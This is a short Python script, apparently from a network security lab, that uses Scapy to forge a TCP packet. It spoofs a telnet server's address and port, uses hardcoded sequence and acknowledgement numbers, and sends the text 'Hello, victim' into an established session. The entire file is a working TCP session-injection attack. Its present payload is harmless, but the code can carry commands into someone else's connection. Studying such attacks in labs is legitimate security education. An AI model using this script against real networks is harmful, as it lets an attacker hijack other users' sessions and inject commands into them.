#!/usr/bin/env python3
from scapy.all import IP, TCP, send, ls

ip = IP(src="10.3.0.2", dst="10.3.0.3")

data = "\r Hello, victim \r"

ack = 2875355672
seq = 1492185207

tcp = TCP(sport=23, dport=50456, flags="PA", seq=seq, ack=ack)
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)